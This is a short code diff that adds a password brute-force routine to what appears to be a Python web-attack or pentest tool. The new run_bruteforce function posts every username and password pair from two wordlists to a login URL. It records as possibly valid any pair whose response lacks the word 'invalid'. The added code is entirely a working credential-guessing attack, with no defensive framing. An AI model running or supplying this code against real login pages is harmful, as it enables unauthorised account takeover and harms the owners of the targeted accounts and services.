@@ -178,6 +178,23 @@ def save_results(path):
         print(f"[+] Results saved to: {path}")
     except Exception as e:
         print(f"[!] Failed to save results: {e}")
+def run_bruteforce(url, userlist, passlist):
+    if not userlist or not passlist:
+        print("[!] Missing wordlists.")
+        return
+    with open(userlist) as ufile, open(passlist) as pfile:
+        users = [u.strip() for u in ufile]
+        passwords = [p.strip() for p in pfile]
+    for user in users:
+        for pwd in passwords:
+            data = {'username': user, 'password': pwd}
+            try:
+                r = requests.post(url, data=data, timeout=5)
+                if "invalid" not in r.text.lower():
+                    print(f"[LOGIN] {user}:{pwd} => Possibly Valid")
+                    results.append({"mode": "bruteforce", "url": url, "payload": f"{user}:{pwd}", "vulnerable": True})
+            except:
+                continue
 
 def display_results():
     if not results:
